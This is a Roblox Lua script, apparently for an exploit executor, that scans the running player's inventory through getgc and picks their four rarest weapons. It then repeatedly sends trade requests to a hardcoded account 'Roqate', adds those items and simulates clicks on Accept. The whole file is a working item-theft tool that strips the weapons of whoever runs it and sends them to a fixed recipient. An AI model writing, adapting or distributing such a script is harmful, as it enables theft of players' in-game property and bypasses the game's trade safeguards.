local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualInputManager = game:GetService("VirtualInputManager")
local LocalPlayer = Players.LocalPlayer

local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local ITEM_ADD_DELAY = 0.4
local TRADE_COOLDOWN = 2
local ACCEPT_WAIT_TIMEOUT = 20

local RARITY_PRIORITY = { Godly = 1, Ancient = 2, Unique = 3, Classic = 4 }
local ALLOWED_RARITIES = {}
for r,_ in pairs(RARITY_PRIORITY) do ALLOWED_RARITIES[r] = true end

local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
}

-- === Inventory Functions ===
local function getCorrectMyInventory()
    for _,module in ipairs(getgc(true)) do
        if type(module) == "table" and rawget(module, "MyInventory") then
            local inv = module.MyInventory
            if inv.Data and inv.Data.Weapons and inv.Data.Weapons.Classic then
                return inv
            end
        end
    end
    return nil
end

local function getTop4Weapons()
    local inv = getCorrectMyInventory()
    if not inv then return {} end

    local candidates = {}
    for _, categoryTable in pairs(inv.Data.Weapons) do
        for weaponName, weaponData in pairs(categoryTable) do
            if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
                local rarity = weaponData.Rarity
                if rarity and ALLOWED_RARITIES[rarity] then
                    table.insert(candidates, {
                        name = weaponName,
                        rarity = rarity,
                        priority = RARITY_PRIORITY[rarity] or 999
                    })
                end
            end
        end
    end

    table.sort(candidates, function(a,b) return a.priority < b.priority end)
    local picked = {}
    for i = 1, math.min(#candidates, MAX_ITEMS_PER_TRADE) do
        table.insert(picked, candidates[i].name)
    end
    return picked
end

-- === GUI Detection ===
local function waitForTradeGUI()
    local gui
    local start = os.clock()
    repeat
        gui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
        task.wait(0.2)
    until gui or os.clock() - start > 10
    return gui
end

local function findAcceptButton(gui)
    for _, btn in ipairs(gui:GetDescendants()) do
        if btn:IsA("TextButton") and (string.find(string.lower(btn.Text), "accept") or string.find(string.lower(btn.Text), "please wait")) then
            return btn
        end
    end
    return nil
end

local function waitUntilAcceptReady(btn)
    local startTime = os.clock()
    while os.clock() - startTime < 20 do
        local txt = string.lower(btn.Text)
        if not string.find(txt, "please wait") then
            return true -- ready to click
        end
        task.wait(0.5)
    end
    return false
end

local function waitForOtherAccept(gui)
    local startTime = os.clock()
    while os.clock() - startTime < ACCEPT_WAIT_TIMEOUT do
        for _, label in ipairs(gui:GetDescendants()) do
            if label:IsA("TextLabel") and string.find(string.lower(label.Text), "other player has accepted") then
                return true
            end
        end
        task.wait(0.3)
    end
    return false
end

local function guiStillActive(gui)
    for _, lbl in ipairs(gui:GetDescendants()) do
        if lbl:IsA("TextLabel") then
            local t = string.lower(lbl.Text)
            if string.find(t, "their offer") or string.find(t, "decline") then
                return true
            end
        end
    end
    return false
end

local function clickButton(btn)
    local pos = btn.AbsolutePosition + btn.AbsoluteSize/2
    VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, true, nil, 0)
    task.wait(0.05)
    VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, false, nil, 0)
end

-- === Trade Steps ===
local function add4Items(weapons)
    for _, weapon in ipairs(weapons) do
        TradeRemotes.OfferItem:FireServer(weapon, "Weapons")
        task.wait(ITEM_ADD_DELAY)
    end
end

local function doTradeCycle(targetPlayer)
    print("🎯 Starting trade with", targetPlayer.Name)
    local weapons = getTop4Weapons()
    if #weapons == 0 then
        warn("No tradable items!")
        return
    end

    pcall(function() TradeRemotes.SendRequest:InvokeServer(targetPlayer) end)

    local gui = waitForTradeGUI()
    if not gui then
        warn("Trade GUI not found!")
        return
    end

    -- Step 1: Add only 4 items, then stop adding
    add4Items(weapons)
    print("✅ 4 items added, stopping further adds")

    -- Step 2: Find Accept button (even if says Please wait)
    local acceptBtn = findAcceptButton(gui)
    if not acceptBtn then
        warn("No Accept/Please Wait button found!")
        return
    end

    -- Step 3: Wait until countdown gone
    print("⏳ Waiting for countdown to finish...")
    if waitUntilAcceptReady(acceptBtn) then
        print("✅ Countdown done → clicking Accept")
        clickButton(acceptBtn)
    else
        warn("Countdown did not finish in time!")
        return
    end

    -- Step 4: Wait for Other Player Accepted
    print("⏳ Waiting for other player...")
    if waitForOtherAccept(gui) then
        print("✅ Other player accepted → clicking Accept again")
        clickButton(acceptBtn)
    else
        warn("Timeout waiting for other player.")
    end

    -- Step 5: Wait for GUI to close (Their Offer/Decline disappears)
    local closeStart = os.clock()
    while os.clock() - closeStart < 10 do
        if not guiStillActive(gui) then
            break
        end
        task.wait(0.5)
    end

    print("✅ Trade cycle ended")
end

-- === Loop ===
while true do
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target then
        doTradeCycle(target)
    else
        print("Waiting for", TARGET_PLAYER, "to be in game...")
    end
    task.wait(TRADE_COOLDOWN)
end

